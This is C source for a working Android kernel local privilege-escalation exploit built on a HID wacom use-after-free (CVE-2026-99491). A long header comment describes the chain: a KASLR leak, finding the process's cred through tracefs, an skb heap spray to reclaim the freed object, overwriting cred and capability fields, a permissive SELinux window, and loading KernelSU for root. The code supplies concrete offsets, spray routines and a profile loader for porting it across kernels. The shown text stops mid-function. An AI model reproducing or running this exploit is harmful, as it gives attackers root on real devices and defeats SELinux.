/*
 * CVE-2026-99491 - HID wacom: dangling sibling touch_input UAF -> controlled call
 * Target : aarch64 Android, kernel 5.15 (uhid write ABI, shell domain)
 * Kernel : drivers/hid/wacom_sys.c as of 5.15.178 (pre-6.12.117 fix
 *          ef32877368a7 / 1178927ffa54)
 * SELinux: Enforcing (uhid write + evdev read + tracefs allowed for shell)
 * Patches: absent (shared->touch_input never cleared on sibling removal)
 * Mitig. : CFI_CLANG=y (classic CFI), KASLR on (slide leaked here), SMEP/SMAP on
 * Status : EXP - temporary KernelSU root (su -c id -> uid 0, u:r:ksu:s0)
 *
 * Chain
 * -----
 * 1. KASLR: a uhid device's descriptor carries a forged ToolSerial usage
 *    array (wacom_wac_pen_serial_enforce OOB read, CVE-2026-98499), so an
 *    INPUT2 report reads 32 bits at uhid + 88 + 4*index and delivers them
 *    as EV_MSC/MSC_SERIAL on the evdev node.  Index 2288/2289 give
 *    worker.func (uhid_device_add_worker.cfi_jt) -> slide.
 * 2. Cred discovery: the shell is in readtracefs and may write the
 *    kmem/rss_stat trigger, which enables kmem_cache_alloc/kmalloc.  A
 *    child is forked with an exec handshake; its post-exec committed cred
 *    (bytes_req 0xb0, prepare_creds call-site low21 0x18a128) and the
 *    lsm_cred_alloc blob appear as pairs in the per-CPU raw ring.
 * 3. Write primitive: the 99491 UAF frees the sibling touch input_dev
 *    (kmalloc-2k); the pad's MUTE_DEVICE report still calls input_event()
 *    on it.  Reclaiming the slot with an skb payload yields a fake
 *    input_dev whose vals pointer is arbitrary; input_handle_event()
 *    stores a fixed 8-byte input_value there with no indirect call (so
 *    classic CFI never runs):
 *      - switch word 05 00 0e 00 00 00 00 00  {EV_SW, SW_MUTE_DEVICE, 0}
 *      - SYN word: leave sw[] clear so the switch event is dropped and
 *        input_sync's EV_SYN/SYN_REPORT appends input_value(0,0,0) --
 *        eight clean zero bytes.
 * 4. Credential patch: the euid oracle writes cred+0x10 (euid=0,
 *    sgid=0x000e0005) and the child reports geteuid() through the status
 *    pipe; the live cred is the first hit.  Three overlapping stores at
 *    R+0x36/+0x3a/+0x3e pin CapEff/CapBnd = 0x0005000e0005000e
 *    (DAC_OVERRIDE, DAC_READ_SEARCH, FOWNER, SYS_MODULE, SYS_CHROOT,
 *    MAC_ADMIN, SYSLOG, WAKE_ALARM, bits 48/50) and are verified from
 *    the child's /proc/self/status.
 * 5. Permissive window without touching selinux_state: the SYN zero
 *    word sets fsuid=fsgid=0, so the child opens the root-owned 0644
 *    selinuxfs enforce file through the owner DAC bits (no
 *    CAP_DAC_OVERRIDE, whose capability-class check denies shell).  Its
 *    denied write allocates a 72-byte struct avc_node; the tracefs kmem
 *    trace identifies it (kmem_cache_alloc return low21 0xaca00).  The
 *    switch word at node+28 sets AVD_FLAGS_PERMISSIVE (avd.flags bit 0),
 *    so avc_denied() returns 0 for the cached decision and the child's
 *    own setenforce write is allowed.  selinux_state and the adjacent
 *    sel_netport_hash are never written (the old selinux_state-6 store
 *    corrupted that list and could panic a later port-255 bind).
 * 6. KernelSU bootstrap: the parent patches android13-5.15_kernelsu.ko
 *    for this boot's slide into /data/local/tmp/ksu-patched.ko (the
 *    child's fsuid 0 cannot create files there); the child loads it in
 *    the permissive window with finit_module, restores Enforcing
 *    immediately, runs ksud install and GRANT_ROOT.  su -c id then
 *    returns uid 0 in u:r:ksu:s0.
 *
 * Every target is reached through the direct vals pointer, so the old
 * anchor search and the 24-byte evdev record chain are not needed.
 *
 * Offsets are for the 5.15.178 device build (vmlinux .symtab +
 * disassembly):
 * uhid_device: input_buf@80 (size@84, data@86), waitq@4464,
 *   qlock@4488, head@4492, tail@4493, outq@4496, worker@9216.
 * input_dev: evbit@40, swbit@200, sw@464, num_vals@1520, max_vals@1524,
 *   vals@1528.
 * cred: usage@0, uid@4, gid@8, suid@0xc, sgid@0x10, euid@0x14, egid@0x18,
 *   fsuid@0x1c, fsgid@0x20, securebits@0x24, cap_inheritable@0x28,
 *   cap_permitted@0x30, cap_effective@0x38, cap_bset@0x40,
 *   cap_ambient@0x48, security@0x78.
 */
#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/input.h>
#include <linux/uhid.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "ksu_boot.h"

#define WACOM_VID 0x056a
#define PHYS_COMMON "uhidpair/99"
#define NAME_TOUCH "wacom-pair-touch"
#define NAME_PAD   "wacom-pair-pad"
#define NAME_ANCHOR "wacom-anchor"

/* Device build symbols (link-time VAs, vmlinux.elf .symtab).  INIT_WORK()
 * stores the CFI jump-table thunk, so the leaked worker.func is the
 * uhid_device_add_worker.cfi_jt address, not the function itself. */
#define SYM_UHID_WORKER     0xffffffc009762578ULL /* add_worker.cfi_jt */
#define SYM_EVDEV_EVENTS    0xffffffc008f25450ULL /* evdev_events */
#define SYM_EVDEV_EVENTS_JT 0xffffffc009737228ULL /* evdev_events.cfi_jt */
#define SYM_SELINUX_BLOB_SIZES 0xffffffc00a152cc8ULL /* selinux_blob_sizes */
#define SYM_SELINUX_STATE   0xffffffc00ad99cf0ULL /* enforcing@0, checkreqprot@1,
                                                   * initialized@2, policycap@3 */
#define UHID_WAITQ_SELF     0x1178ULL             /* &waitq.head (offsetof+8) */

/* input core / evdev field offsets (5.15 build). */
#define DEV_EVBIT        40
#define DEV_SWBIT        200
#define DEV_SW           464
#define DEV_ABSBIT       152
#define DEV_ABSINFO      344
#define DEV_EVENT        496
#define DEV_GRAB         504
#define DEV_EVENT_LOCK   512
#define DEV_H_LIST       1488
#define DEV_NUM_VALS     1520
#define DEV_MAX_VALS     1524
#define DEV_VALS         1528
#define DEV_TIMESTAMP0   1544  /* timestamp[INPUT_CLK_REAL] */
#define DEV_TIMESTAMP    1552  /* timestamp[INPUT_CLK_MONO] */
#define DEV_INHIBITED    1568
#define HD_PRIVATE       0
#define HD_DEV           24
#define HD_HANDLER       32
#define HR_EVENT         8
#define HR_EVENTS        16
#define HR_FILTER        24
#define EVD_GRAB         0x58
#define CLI_HEAD         0
#define CLI_TAIL         4
#define CLI_PACKET_HEAD  8
#define CLI_BUFFER_LOCK  12
#define CLI_CLK_TYPE     72
#define CLI_REVOKED      76
#define CLI_BUFSIZE      336
#define CLI_BUFFER       344

/* stage 2: fake objects inside the anchor input_buf (A + 86 + off).
 * C_OFF_EVD must be 2 mod 8: evdev + 0x58 is loaded with ldar and has to
 * be naturally aligned. */
#define C_OFF_EVD 130   /* struct evdev (only .grab is read) */
#define C_OFF_H   512   /* struct input_handle */
#define C_OFF_P   584   /* struct input_handler */
#define C_OFF_CLI 800   /* struct evdev_client (residue-adjusted) */
#define C_OFF_E   2100  /* pre-filled input_value entry */
#define C_OFF_TS  2400  /* fake input_dev for input_get_timestamp */

/* stage 2: cred leak through the kmem tracepoint. */
#define TR_PATH "/sys/kernel/tracing"
#define TR_PAGE 4096UL
#define CRED_REQ 0xb0ULL        /* sizeof(struct cred) */
#define CRED_SITE_LOW21 0x18a128UL /* prepare_creds -> cred_jar alloc */
#define BLOB_SITE_LOW21 0xa4af8UL  /* lsm_cred_alloc -> kzalloc(blob) */
#define BLOB_REQ_MIN 24ULL
#define BLOB_REQ_MAX 32ULL
/* Per-policy/profile constants, measured once during research:
 * u:r:init:s0 = 72 and selinux_blob_sizes.lbs_cred = 0 on this build. */
#define SID_INIT_PROFILE 72u
#define LBS_CRED_PROFILE 0u
#define TRACE_BUF_BYTES (16UL << 20)

/* Fake-structure offsets inside input_buf data (uhid + 86).  OFF_EVDEV
 * must be 2 mod 8 so that evdev + 0x58 is naturally aligned (ldar). */
#define OFF_HANDLE 512
#define OFF_AHANDLER 592   /* input_handler for the evdev chain */
#define OFF_EVDEV  642
#define OFF_CLIENT 762
#define OFF_VALS   1200
#define OFF_FDEV   2048
/* The record that lands on A->waitq.head.next is the EV_SW event written
 * by the kernel: struct input_event { sec, usec, type=EV_SW, code=SW_MUTE_DEVICE,
 * value }.  Its low 32 bits are (code << 16) | type = 0x000e0005. */
#define EXPECT_VALUE ((14u << 16) | 5u)

/*
 * Runtime kernel profile (2026-11-21 multi-kernel adaptation).
 *
 * The 5.15 constants above stay as defaults; a profile file loaded with
 * --profile (or CVE99491_PROFILE) overrides the fields a different kernel
 * needs.  One binary can then serve 5.15 / 6.1 / 6.6 / 6.12 / 6.18 without
 * recompiling.  Trace sites may be 0 = "accept any allocation with matching
 * bytes_req" (the euid oracle / AVC retry loop validates candidates).
 */
struct kprofile {
    unsigned long long worker_link;
    /* EV_MSC/MSC_SERIAL word index for worker.func: 2288 on 5.15..6.12
     * (uhid input_buf@80 -> data@86 -> +88 leak base), 2286 on 6.18
     * (input_buf@72 -> data@78 -> +80 base). */
    unsigned kaslr_idx;
    unsigned dev_evbit, dev_swbit, dev_sw;
    unsigned dev_num_vals, dev_max_vals, dev_vals;
    unsigned cred_req, blob_req_min, blob_req_max, avc_req;
    /* 0 = 5.15..6.12 ring layout; 618 = 6.18: kmem_cache_alloc carries the
     * __string descriptor at +24, so bytes_req moves to +32 (kmalloc stays
     * at +24).  Detected per event by payload length >= 61. */
    unsigned trace_layout;
    unsigned long long cred_site_low21, blob_site_low21, avc_site_low21;
    unsigned cred_euid_off, cred_cap1, cred_cap2, cred_cap3, cred_fsuid_off;
    int have_slide;
    unsigned long long slide;
    int min_pairs;
};

static struct kprofile kp = {
    .worker_link = SYM_UHID_WORKER,
    .kaslr_idx = 2288,
    .dev_evbit = 40, .dev_swbit = 200, .dev_sw = 464,
    .dev_num_vals = 1520, .dev_max_vals = 1524, .dev_vals = 1528,
    .cred_req = 0xb0, .blob_req_min = 24, .blob_req_max = 32, .avc_req = 72,
    .trace_layout = 0,
    .cred_site_low21 = 0x18a128ULL, .blob_site_low21 = 0xa4af8ULL,
    .avc_site_low21 = 0xaca00ULL,
    .cred_euid_off = 0x10, .cred_cap1 = 0x36, .cred_cap2 = 0x3a, .cred_cap3 = 0x3e,
    .cred_fsuid_off = 0x1c,
    .have_slide = 0, .slide = 0, .min_pairs = 2,
};

static int kp_parse(struct kprofile *p, const char *key, const char *val) {
    unsigned long long v = strtoull(val, NULL, 0);

    if (!strcmp(key, "worker_link")) p->worker_link = v;
    else if (!strcmp(key, "kaslr_idx")) p->kaslr_idx = (unsigned)v;
    else if (!strcmp(key, "dev_evbit")) p->dev_evbit = (unsigned)v;
    else if (!strcmp(key, "dev_swbit")) p->dev_swbit = (unsigned)v;
    else if (!strcmp(key, "dev_sw")) p->dev_sw = (unsigned)v;
    else if (!strcmp(key, "dev_num_vals")) p->dev_num_vals = (unsigned)v;
    else if (!strcmp(key, "dev_max_vals")) p->dev_max_vals = (unsigned)v;
    else if (!strcmp(key, "dev_vals")) p->dev_vals = (unsigned)v;
    else if (!strcmp(key, "cred_req")) p->cred_req = (unsigned)v;
    else if (!strcmp(key, "blob_req_min")) p->blob_req_min = (unsigned)v;
    else if (!strcmp(key, "blob_req_max")) p->blob_req_max = (unsigned)v;
    else if (!strcmp(key, "avc_req")) p->avc_req = (unsigned)v;
    else if (!strcmp(key, "trace_layout")) p->trace_layout = (unsigned)v;
    else if (!strcmp(key, "cred_site_low21")) p->cred_site_low21 = v & 0x1fffffULL;
    else if (!strcmp(key, "blob_site_low21")) p->blob_site_low21 = v & 0x1fffffULL;
    else if (!strcmp(key, "avc_site_low21")) p->avc_site_low21 = v & 0x1fffffULL;
    else if (!strcmp(key, "cred_euid_off")) p->cred_euid_off = (unsigned)v;
    else if (!strcmp(key, "cred_cap1")) p->cred_cap1 = (unsigned)v;
    else if (!strcmp(key, "cred_cap2")) p->cred_cap2 = (unsigned)v;
    else if (!strcmp(key, "cred_cap3")) p->cred_cap3 = (unsigned)v;
    else if (!strcmp(key, "cred_fsuid_off")) p->cred_fsuid_off = (unsigned)v;
    else if (!strcmp(key, "slide")) { p->slide = v; p->have_slide = 1; }
    else if (!strcmp(key, "min_pairs")) p->min_pairs = (int)v;
    else return -1;  /* unknown key: refuse, don't silently run wrong offsets */
    return 0;
}

static int load_profile(const char *path) {
    FILE *f = fopen(path, "r");
    char line[256];

    if (!f) {
        fprintf(stderr, "[-] profile open failed: %s\n", path);
        return -1;
    }
    while (fgets(line, sizeof line, f)) {
        char *eq, *k, *v;
        line[strcspn(line, "\r\n")] = 0;
        if (line[0] == '#' || line[0] == 0) continue;
        eq = strchr(line, '=');
        if (!eq) continue;
        *eq = 0;
        k = line; v = eq + 1;
        while (*k == ' ' || *k == '\t') k++;
        while (*v == ' ' || *v == '\t') v++;
        if (kp_parse(&kp, k, v) != 0) {
            fprintf(stderr, "[-] unknown profile key: %s\n", k);
            fclose(f);
            return -1;
        }
    }
    fclose(f);
    return 0;
}

#define SPRAY_LEN 1664UL
#define SPRAY_PAIRS 24

static long now_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1000LL + ts.tv_nsec / 1000000;
}

static int uhid_open(void) {
    int fd = open("/dev/uhid", O_RDWR | O_CLOEXEC | O_NONBLOCK);
    if (fd < 0) perror("open /dev/uhid");
    return fd;
}

static int uhid_create(int fd, const char *name, const char *phys,
                       unsigned pid, const unsigned char *rdesc, size_t rlen) {
    static struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_CREATE2;
    strncpy((char *)ev.u.create2.name, name, sizeof(ev.u.create2.name) - 1);
    if (phys)
        strncpy((char *)ev.u.create2.phys, phys, sizeof(ev.u.create2.phys) - 1);
    strncpy((char *)ev.u.create2.uniq, name, sizeof(ev.u.create2.uniq) - 1);
    memcpy(ev.u.create2.rd_data, rdesc, rlen);
    ev.u.create2.rd_size = rlen;
    ev.u.create2.bus = BUS_USB;
    ev.u.create2.vendor = WACOM_VID;
    ev.u.create2.product = pid;
    if (write(fd, &ev, sizeof(ev)) < 0) {
        perror("UHID_CREATE2");
        return -1;
    }
    return 0;
}

static int uhid_destroy(int fd) {
    struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_DESTROY;
    return write(fd, &ev, sizeof(ev)) < 0 ? -1 : 0;
}

/* Full-event INPUT2 write for the anchor: report id 1, InRange at data[1],
 * and the 4096-byte payload (fake structures live at fixed data offsets). */
static int uhid_input2(int fd, const unsigned char *payload, int inrange) {
    static struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_INPUT2;
    ev.u.input2.size = 6;
    if (payload)
        memcpy(ev.u.input2.data, payload, sizeof(ev.u.input2.data));
    ev.u.input2.data[0] = 0x01;           /* report id 1 */
    ev.u.input2.data[1] = inrange ? 1 : 0;/* InRange */
    return write(fd, &ev, sizeof(ev)) < 0 ? -1 : 0;
}

/* Raw INPUT2 write with an explicit report payload (pad trigger). */
static int uhid_input_raw(int fd, const unsigned char *data, size_t n) {
    static struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_INPUT2;
    ev.u.input2.size = n;
    memcpy(ev.u.input2.data, data, n);
    return write(fd, &ev, sizeof(ev)) < 0 ? -1 : 0;
}

static int pump_until_start(int fd, long deadline_ms) {
    struct uhid_event ev, rep;
    while (now_ms() < deadline_ms) {
        ssize_t n = read(fd, &ev, sizeof(ev));
        if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
            usleep(5000);
            continue;
        }
        if (n <= 0)
            continue;
        if (ev.type == UHID_START)
            return 1;
        if (ev.type == UHID_GET_REPORT) {
            memset(&rep, 0, sizeof(rep));
            rep.type = UHID_GET_REPORT_REPLY;
            rep.u.get_report_reply.id = ev.u.get_report.id;
            write(fd, &rep, sizeof(rep));
        } else if (ev.type == UHID_SET_REPORT) {
            memset(&rep, 0, sizeof(rep));
            rep.type = UHID_SET_REPORT_REPLY;
            rep.u.set_report_reply.id = ev.u.set_report.id;
            write(fd, &rep, sizeof(rep));
        }
    }
    return 0;
}

/* Wait until the uhid queue drains (two consecutive EAGAIN reads). */
static int pump_drain(int fd, long deadline_ms) {
    struct uhid_event ev, rep;
    int idle = 0;
    while (now_ms() < deadline_ms) {
        ssize_t n = read(fd, &ev, sizeof(ev));
        if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
            if (++idle >= 2)
                return 0;
            usleep(10000);
            continue;
        }
        idle = 0;
        if (n <= 0)
            continue;
        if (ev.type == UHID_GET_REPORT) {
            memset(&rep, 0, sizeof(rep));
            rep.type = UHID_GET_REPORT_REPLY;
            rep.u.get_report_reply.id = ev.u.get_report.id;
            write(fd, &rep, sizeof(rep));
        } else if (ev.type == UHID_SET_REPORT) {
            memset(&rep, 0, sizeof(rep));
            rep.type = UHID_SET_REPORT_REPLY;
            rep.u.set_report_reply.id = ev.u.set_report.id;
            write(fd, &rep, sizeof(rep));
        }
    }
    return -1;
}

/* Descriptor: Digitizer/Pen with ToolSerial usage at array index `index`.
 * The 32-bit field reads uhid_device + 88 + 4*index in
 * wacom_wac_pen_serial_enforce(). */
static size_t gen_rdesc(unsigned index, unsigned char *out) {
    static const unsigned char tpl[] = {
        0x05, 0x0d, 0x09, 0x02, 0xa1, 0x01,
        0x05, 0x0d, 0x09, 0x20, 0xa1, 0x00,
        0x85, 0x01,
        0x05, 0x0d, 0x09, 0x32, 0x15, 0x00, 0x25, 0x01,
        0x75, 0x08, 0x95, 0x01, 0x81, 0x02,
        0x05, 0x0d, 0x1a, 0x00, 0x01,
        0x2a, 0x00, 0x00,           /* Usage Maximum (patched) */
        0x09, 0x5b,
        0x15, 0x00, 0x27, 0xff, 0xff, 0xff, 0x7f,
        0x75, 0x20, 0x95, 0x01, 0x81, 0x02,
        0xc0, 0xc0
    };
    unsigned usage_max = 0x0100 + index - 1;
    memcpy(out, tpl, sizeof(tpl));
    for (size_t i = 0; i + 2 < sizeof(tpl); i++) {
        if (out[i] == 0x2a && out[i + 3] == 0x09 && out[i + 4] == 0x5b) {
            out[i + 1] = usage_max & 0xff;
            out[i + 2] = usage_max >> 8;
            break;
        }
    }
    return sizeof(tpl);
}

/* --- evdev node discovery ------------------------------------------- */

/* Dynamic uhid devices can push the evdev minor high (event256+ was seen)
 * and a run may leave nodes behind, so keep room for the whole set. */
#define MAXEV 256
static int list_events(char names[MAXEV][16]) {
    DIR *d = opendir("/dev/input");
    int n = 0;
    struct dirent *e;
    if (!d)
        return 0;
    while ((e = readdir(d)) && n < MAXEV) {
        if (strncmp(e->d_name, "event", 5) == 0)
            snprintf(names[n++], 16, "%s", e->d_name);
    }
    closedir(d);
    return n;
}

static int find_new_event(char old[MAXEV][16], int nold, char *out, size_t outsz,
                          long timeout_ms) {
    long dl = now_ms() + timeout_ms;
    while (now_ms() < dl) {
        char cur[MAXEV][16];
        int n = list_events(cur);
        for (int i = 0; i < n; i++) {
            int seen = 0;
            for (int j = 0; j < nold; j++)
                if (!strcmp(cur[i], old[j])) { seen = 1; break; }
            if (!seen) {
                snprintf(out, outsz, "/dev/input/%s", cur[i]);
                return 0;
            }
        }
        usleep(10000);
    }
    return -1;
}

/* Read one MSC_SERIAL value from an open evdev fd (non-blocking). */
static int read_msc_serial(int evfd, unsigned *val, long timeout_ms) {
    long dl = now_ms() + timeout_ms;
    struct input_event ev;
    while (now_ms() < dl) {
        ssize_t n = read(evfd, &ev, sizeof(ev));
        if (n == (ssize_t)sizeof(ev)) {
            if (ev.type == EV_MSC && ev.code == MSC_SERIAL) {
                *val = (unsigned)ev.value;
                return 0;
            }
            continue;
        }
        if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK))
            usleep(5000);
        else
            usleep(5000);
    }
    return -1;
}

/* Drop queued evdev events, then send a report and read the leaked word. */
static int leak_read(int uhidfd, int evfd, const unsigned char *payload,
                     int inrange, unsigned *val) {
    struct input_event ev;
    while (read(evfd, &ev, sizeof(ev)) == (ssize_t)sizeof(ev))
        ;
    if (uhid_input2(uhidfd, payload, inrange) < 0)
        return -1;
    return read_msc_serial(evfd, val, 500);
}

/* --- UAF trigger devices (T/P pair, same as the PoC) ----------------- */

static const unsigned char rdesc_touch[] = {
    0x05, 0x0d, 0x09, 0x04, 0xa1, 0x01, 0x85, 0x01,
    0x05, 0x0d, 0x09, 0x22, 0xa1, 0x00,
    0x09, 0x42, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x32, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x05, 0x01, 0x09, 0x30,
    0x16, 0x01, 0x00, 0x26, 0xff, 0x7f,
    0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x31, 0x26, 0xff, 0x7f, 0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0xc0,
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x00,
    0x06, 0x0d, 0xff, 0x0a, 0x81, 0x09,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0xc0, 0xc0
};

static const unsigned char rdesc_pad[] = {
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x01, 0x85, 0x02,
    0x05, 0x0d, 0x09, 0x20, 0xa1, 0x02,
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x00,
    0x06, 0x0d, 0xff, 0x0a, 0x86, 0x09,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x06, 0x0d, 0xff, 0x0a, 0x54, 0x04,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0xc0, 0xc0, 0xc0
};

static int spray_fd[SPRAY_PAIRS][2];

static int spray_setup(void) {
    int rcv = 1048576;
    for (int p = 0; p < SPRAY_PAIRS; p++) {
        spray_fd[p][0] = spray_fd[p][1] = -1;
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, spray_fd[p]) < 0) {
            perror("socketpair");
            return -1;
        }
        for (int e = 0; e < 2; e++) {
            setsockopt(spray_fd[p][e], SOL_SOCKET, SO_RCVBUF, &rcv, sizeof(rcv));
            setsockopt(spray_fd[p][e], SOL_SOCKET, SO_SNDBUF, &rcv, sizeof(rcv));
        }
    }
    return 0;
}

static int spray_fire(long n, const unsigned char *buf) {
    cpu_set_t saved, one;
    if (sched_getaffinity(0, sizeof(saved), &saved) < 0)
        return -1;
    long per_cpu = n / 8;
    for (int c = 0; c < 8; c++) {
        if (!CPU_ISSET(c, &saved))
            continue;
        CPU_ZERO(&one);
        CPU_SET(c, &one);
        sched_setaffinity(0, sizeof(one), &one);
        for (long i = 0; i < per_cpu; i++) {
            int p = (int)(i % SPRAY_PAIRS);
            if (write(spray_fd[p][0], buf, SPRAY_LEN) != (ssize_t)SPRAY_LEN) {
                perror("spray write");
                sched_setaffinity(0, sizeof(saved), &saved);
                return -1;
            }
        }
    }
    sched_setaffinity(0, sizeof(saved), &saved);
    return 0;
}

static int spray_spread(long n, long ms, const unsigned char *buf) {
    const long chunk = 384;
    long chunks = (n + chunk - 1) / chunk;
    long gap_us = chunks > 1 ? ms * 1000 / (chunks - 1) : 0;
    if (gap_us < 1000)
        gap_us = 1000;
    for (long c = 0; c < chunks; c++) {
        long k = (c == chunks - 1) ? n - chunk * (chunks - 1) : chunk;
        if (k > 0 && spray_fire(k, buf) < 0)
            return -1;
        if (c < chunks - 1)
            usleep(gap_us);
    }
    return 0;
}

static void spray_release(void) {
    for (int p = 0; p < SPRAY_PAIRS; p++) {
        if (spray_fd[p][0] >= 0) {
            close(spray_fd[p][0]);
            close(spray_fd[p][1]);
            spray_fd[p][0] = spray_fd[p][1] = -1;
        }
    }
}

/* Free every sprayed skb so the next attempt can reclaim the same slot. */
static void spray_drain(void) {
    static unsigned char tmp[65536];
    for (int p = 0; p < SPRAY_PAIRS; p++) {
        if (spray_fd[p][1] < 0)
            continue;
        for (;;) {
            ssize_t n = recv(spray_fd[p][1], tmp, sizeof(tmp), MSG_DONTWAIT);
            if (n <= 0)
                break;
        }
    }
}

/* --- anchor setup/leak helpers --------------------------------------- */

struct anchor {
    int fd;
    int evfd;
    unsigned char rdesc[64];
    size_t rlen;
    char node[32];
};

/* Create an anchor device, wait for its evdev node, probe and drain. */
static int anchor_create(struct anchor *a, unsigned index) {
    char old[MAXEV][16];
    int nold = list_events(old);
    a->rlen = gen_rdesc(index, a->rdesc);
    a->fd = uhid_open();
    if (a->fd < 0)
        return -1;
    if (uhid_create(a->fd, NAME_ANCHOR, NULL, 0x2200 + index, a->rdesc,
                    a->rlen) < 0)
        return -1;
    /* hid-wacom probe + input registration runs asynchronously and can
     * take longer than a second under load. */
    if (find_new_event(old, nold, a->node, sizeof(a->node), 3000) < 0) {
        fprintf(stderr, "[-] no evdev node for anchor index %u\n", index);
        return -1;
    }
    a->evfd = open(a->node, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (a->evfd < 0) {
        perror("open evdev");
        return -1;
    }
    if (!pump_until_start(a->fd, now_ms() + 3000)) {
        fprintf(stderr, "[-] probe did not start (index %u)\n", index);
        return -1;
    }
    pump_drain(a->fd, now_ms() + 500);
    return 0;
}

static void anchor_close(struct anchor *a) {
    if (a->evfd >= 0)
        close(a->evfd);
    if (a->fd >= 0) {
        uhid_destroy(a->fd);
        close(a->fd);
    }
    a->fd = a->evfd = -1;
}

/* Leak one 32-bit word at index `index` from a fresh anchor. */
static int leak_word(unsigned index, unsigned *val) {
    struct anchor a = { .fd = -1, .evfd = -1 };
    if (anchor_create(&a, index) < 0) {
        anchor_close(&a);
        return -1;
    }
    int rc = leak_read(a.fd, a.evfd, NULL, 1, val);
    anchor_close(&a);
    return rc;
}

/* --- stage 2: cred leak through the kmem tracepoint ------------------ */

static int trace_wr(const char *path, const char *s) {
    int fd = open(path, O_WRONLY);
    if (fd < 0)
        return -1;
    ssize_t n = write(fd, s, strlen(s));
    close(fd);
    return n < 0 ? -1 : 0;
}

static void trace_drain_cpu(int cpu) {
    static unsigned char tmp[65536];
    char path[128];
    snprintf(path, sizeof(path), TR_PATH "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return;
    /* Bounded: a live ring can otherwise be drained forever. */
    size_t total = 0;
    while (total < (16UL << 20)) {
        ssize_t n = read(fd, tmp, sizeof(tmp));
        if (n <= 0)
            break;
        total += (size_t)n;
    }
    close(fd);
}

static void trace_reset(void) {
    int fd = open(TR_PATH "/trace", O_WRONLY | O_TRUNC);
    if (fd >= 0)
        close(fd);
    for (int c = 0; c < 8; c++)
        trace_drain_cpu(c);
}

/* Fire rss_stat so the world-writable trigger enables kmem_cache_alloc. */
static void trace_kick(void) {
    size_t n = 4UL << 20;
    unsigned char *p = mmap(NULL, n, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (p == MAP_FAILED)
        return;
    for (size_t i = 0; i < n; i += TR_PAGE)
        p[i] = 1;
    munmap(p, n);
}

static int trace_prepare(void) {
    trace_wr(TR_PATH "/tracing_on", "0");
    trace_reset();
    trace_wr(TR_PATH "/events/kmem/rss_stat/trigger",
             "!enable_event:kmem:kmem_cache_alloc\n");
    trace_wr(TR_PATH "/events/kmem/rss_stat/trigger",
             "!enable_event:kmem:kmalloc\n");
    if (trace_wr(TR_PATH "/events/kmem/rss_stat/trigger",
                 "enable_event:kmem:kmem_cache_alloc\n") != 0)
        return -1;
    /* kmem:kmalloc carries the lsm_cred_alloc kzalloc (the SELinux blob)
     * and is optional: without it the cred is still found. */
    trace_wr(TR_PATH "/events/kmem/rss_stat/trigger",
             "enable_event:kmem:kmalloc\n");
    trace_wr(TR_PATH "/tracing_on", "0");
    trace_reset();
    trace_kick();
    usleep(30000);
    trace_wr(TR_PATH "/tracing_on", "0");
    trace_reset();
    return 0;
}

static unsigned trace_u32(const unsigned char *b, size_t o) {
    unsigned v;
    memcpy(&v, b + o, 4);
    return v;
}
static unsigned long long trace_u64(const unsigned char *b, size_t o) {
    unsigned long long v;
    memcpy(&v, b + o, 8);
    return v;
}

/*
 * Scan the raw per-CPU ring for kmem_cache_alloc records whose common_pid
 * matches and whose bytes_req/call_site identify prepare_creds' cred_jar
 * allocation.  The last such record is the cred the exec committed.
 */
static int g_tr_pidhit, g_tr_reqhit, g_tr_sitehit;
static unsigned long long g_tr_ptrs[8];
static int g_tr_npts;
/* cred -> lsm_cred_alloc blob pairs, in allocation order.  The blob is a
 * kzalloc(24|32) right after the cred_jar alloc in prepare_creds(). */
static unsigned long long g_pair_cred[8], g_pair_blob[8];
static int g_npairs;
static unsigned long long trace_cred_ptr(const unsigned char *b, size_t n,
                                         int pid) {
    unsigned long long last = 0, pending = 0;
    g_tr_pidhit = g_tr_reqhit = g_tr_sitehit = 0;
    g_tr_npts = 0;
    g_npairs = 0;
    for (size_t base = 0; base + TR_PAGE <= n; base += TR_PAGE) {
        unsigned long long commit = trace_u64(b, base + 8);
        size_t o = base + 16, end = base + 16 + commit;
        if (end > base + TR_PAGE)
            end = base + TR_PAGE;
        while (o + 4 <= end) {
            unsigned hdr = trace_u32(b, o), tl = hdr & 31, td = hdr >> 5;
            size_t total;
            int data = 0;
            if (tl == 29) {
                if (!td)
                    break;
                total = 4 + trace_u32(b, o + 4);
            } else if (tl == 30 || tl == 31) {
                total = 8;
            } else if (tl == 0) {
                total = 4 + trace_u32(b, o + 4);
                data = 1;
            } else {
                total = 4 + tl * 4;
                data = 1;
            }
            size_t p = o + (tl == 0 ? 8 : 4);
            if (data && total >= 28 && p + 41 <= end &&
